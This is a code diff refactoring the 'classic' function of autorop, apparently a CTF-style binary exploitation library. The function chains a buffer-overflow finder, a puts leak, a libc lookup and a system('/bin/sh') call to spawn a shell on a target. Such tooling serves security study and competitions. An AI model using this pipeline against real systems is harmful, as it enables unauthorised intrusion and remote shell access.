@@ -1,13 +1,13 @@
 from autorop import PwnState, pipeline, bof, leak, libc, call, constants
+from typing import Callable
 
 
 def classic(
-    state: PwnState,
     find: constants.TYPE_PIPE = bof.corefile,
     leak: constants.TYPE_PIPE = leak.puts,
     lookup: constants.TYPE_PIPE = libc.libc_database,
     shell: constants.TYPE_PIPE = call.system_binsh,
-) -> PwnState:
+) -> constants.TYPE_PIPE:
     """Perform a "classic" attack against a binary.
 
     Launch a find-leak-lookup-shell attack against a binary.
@@ -27,13 +27,17 @@ def classic(
     We use `libc-database <https://github.com/niklasb/libc-database>`_ to find the libc, and then spawn a shell on the target.
 
     Arguments:
-        state: The current ``PwnState``.
         find: "Finder" of vulnerability. :mod:`autorop.bof` may be of interest.
         leak: "Leaker". :mod:`autorop.leak` may be of interest.
         lookup: "Lookup-er" of info. :mod:`autorop.libc` may be of interest.
         shell: Spawner of shell. :mod:`autorop.call` may be of interest.
 
     Returns:
-        Reference to the mutated ``PwnState``.
+        Function which takes a ``PwnState``, and returns reference
+        to the mutated ``PwnState``.
     """
-    return pipeline(state, find, leak, lookup, shell)
+
+    def f(state: PwnState) -> PwnState:
+        return pipeline(state, find, leak, lookup, shell)
+
+    return f
